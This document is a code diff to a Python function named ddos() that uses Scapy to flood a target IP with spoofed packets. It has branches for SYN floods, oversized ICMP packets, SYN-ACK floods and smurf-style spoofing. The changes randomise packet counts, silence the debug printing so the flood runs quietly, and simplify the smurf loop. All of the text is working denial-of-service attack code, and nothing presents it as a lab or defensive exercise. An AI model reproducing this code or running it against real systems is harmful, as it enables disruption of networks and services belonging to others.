@@ -15,22 +15,20 @@ def ddos(target_ip, attack_type, duration):
         while time.time() < end_time:
             src_port = random.randint(1024, 65535)
             src_ip = generate_random_ip()
-            # ammount = random.randint(1, 100)
-            ammount = 111
+            ammount = random.randint(1, 100)
             for _ in range(ammount):
                 pkt = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")
                 send(pkt, verbose=0)
-                print(pkt)
+                # print(pkt)
     elif attack_type == "pod":
         while time.time() < end_time:
             load = 1000
             src_ip = generate_random_ip()
             ammount = random.randint(1, 100)
-            # ammount = 111
             for _ in range(ammount):
                 pkt = IP(src=src_ip, dst=target_ip) / ICMP() / Raw(load="A" * load)
                 send(pkt, verbose=0)
-                print(pkt)
+                # print(pkt)
     elif attack_type == "syn_ack":
         while time.time() < end_time:
             src_port = random.randint(1024, 65535)
@@ -39,14 +37,12 @@ def ddos(target_ip, attack_type, duration):
             for _ in range(ammount):
                 pkt = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="SA")
                 send(pkt, verbose=0)
-                print(pkt)
+                # print(pkt)
     elif attack_type == "smurf":
         while time.time() < end_time:
-            ammount = random.randint(1, 100)
-            for _ in range(ammount):
-                pkt = IP(src=target_ip, dst=target_ip) / ICMP()
-                send(pkt, verbose=0)
-                print(pkt)
+            pkt = IP(src=target_ip, dst=target_ip) / ICMP()
+            send(pkt, verbose=0)
+            # print(pkt)
     else:
         print("Invalid attack type specified.")
         return
